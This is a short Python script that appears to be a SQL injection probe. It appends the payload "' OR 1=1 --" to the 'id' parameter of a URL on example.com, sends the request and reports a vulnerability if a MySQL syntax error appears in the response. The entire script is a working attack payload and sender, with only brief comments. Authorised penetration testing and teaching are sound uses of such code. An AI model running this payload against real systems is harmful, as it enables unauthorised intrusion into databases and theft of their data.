import requests

# Set the vulnerable parameter in the URL
vulnerable_parameter = 'id'

# Set the URL to be tested
url = f"http://example.com/vulnerable_page.php?{vulnerable_parameter}=1"

# Set the payload to be used for SQL injection
payload = "' OR 1=1 --"

# Send a GET request to the URL with the payload injected
response = requests.get(f"{url}{payload}")

# Check for evidence of a successful SQL injection
if "You have an error in your SQL syntax" in response.text:
    print("SQL injection vulnerability found.")
else:
    print("No SQL injection vulnerability found.")